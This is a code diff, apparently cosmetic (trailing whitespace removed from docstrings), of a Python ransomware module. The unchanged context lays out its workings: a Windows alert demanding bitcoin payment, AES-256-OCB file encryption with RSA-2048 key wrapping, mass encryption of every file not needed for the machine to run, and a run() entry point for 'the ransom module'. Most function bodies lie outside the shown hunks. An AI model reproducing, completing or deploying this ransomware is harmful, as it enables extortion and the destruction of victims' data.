@@ -93,7 +93,7 @@ def _iter_files(rsa_key, base_dir=None):
         util.log('{} error: {}'.format(_iter_files.func_name, str(e)))
 
 def request_payment(bitcoin_wallet):
-    """ 
+    """
     Request ransom payment from user with a Windows alert message box
 
     `Required`
@@ -107,16 +107,16 @@ def request_payment(bitcoin_wallet):
         return "{} error: {}".format(request_payment.func_name, str(e))
 
 def encrypt_aes(plaintext, key, padding=chr(0)):
-    """ 
+    """
     AES-256-OCB encryption
 
     `Requires`
     :param str plaintext:   plain text/data
-    :param str key:         session encryption key 
+    :param str key:         session encryption key
 
     `Optional`
     :param str padding:     default: (null byte)
-    
+
     Returns encrypted ciphertext as base64-encoded string
 
     """
@@ -126,18 +126,18 @@ def encrypt_aes(plaintext, key, padding=chr(0)):
     return base64.b64encode(output)
 
 def decrypt_aes(ciphertext, key, padding=chr(0)):
-    """ 
+    """
     AES-256-OCB decryption
 
     `Requires`
     :param str ciphertext:  encrypted block of data
-    :param str key:         session encryption key 
+    :param str key:         session encryption key
 
     `Optional`
     :param str padding:     default: (null byte)
 
     Returns decrypted plaintext as string
-    
+
     """
     data = StringIO.StringIO(base64.b64decode(ciphertext))
     nonce, tag, ciphertext = [ data.read(x) for x in (Cryptodome.Cipher.AES.block_size - 1, Cryptodome.Cipher.AES.block_size, -1) ]
@@ -145,7 +145,7 @@ def decrypt_aes(ciphertext, key, padding=chr(0)):
     return cipher.decrypt_and_verify(ciphertext, tag)
 
 def encrypt_file(filename, rsa_key):
-    """ 
+    """
     Encrypt a file with AES-256-OCB symmetric encryption
     using a randomly generated key, encrypt the key
     with RSA-2048 asymmetric encryption, then store the
@@ -157,7 +157,7 @@ def encrypt_file(filename, rsa_key):
     :param RsaKey rsa_key:        2048-bit public RSA key
 
     Returns True if succesful, otherwise False
-    
+
     """
     try:
         if os.path.isfile(filename):
@@ -181,7 +181,7 @@ def encrypt_file(filename, rsa_key):
     return False
 
 def decrypt_file(filename, key):
-    """ 
+    """
     Decrypt a file that was encrypted with AES-256-OCB encryption
 
     `Required`
@@ -207,7 +207,7 @@ def decrypt_file(filename, key):
     return False
 
 def encrypt_files(args):
-    """ 
+    """
     Encrypt all files that are not required for the machine to function
 
     `Required`
@@ -233,7 +233,7 @@ def encrypt_files(args):
         util.log("{} error: {}".format(encrypt_files.func_name, str(e)))
 
 def decrypt_files(rsa_key):
-    """ 
+    """
     Decrypt all encrypted files on host machine
 
     `Required`
@@ -252,7 +252,7 @@ def decrypt_files(rsa_key):
         util.log("{} error: {}".format(decrypt_files.func_name, str(e)))
 
 def run(args=None):
-    """ 
+    """
     Run the ransom module
 
     `Required`
